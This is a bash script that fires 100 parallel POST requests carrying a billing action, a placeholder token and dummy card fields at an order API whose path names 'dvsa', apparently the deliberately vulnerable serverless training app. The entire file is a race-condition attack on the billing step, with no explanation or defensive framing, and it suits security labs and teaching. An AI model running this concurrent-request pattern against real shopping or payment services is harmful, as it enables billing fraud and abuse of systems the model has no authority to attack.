#!/bin/bash
API="https://p2x3oihjo8.execute-api.us-east-1.amazonaws.com/dvsa/order"
TOKEN="TOKEN"
ORDER_ID="ORDER_ID"

for i in $(seq 1 100); do
  curl -s -X POST "$API" \
    -H "Content-Type: application/json" \
    -H "Authorization: $TOKEN" \
    -d "{\"action\":\"billing\",\"order-id\":\"$ORDER_ID\",\"data\":{\"ccn\":\"xxxxxxxxxxxxxxxx\",\"exp\":\"xy/xy\",\"cvv\":\"xxx\"}}" &
done
wait
echo "DONE"
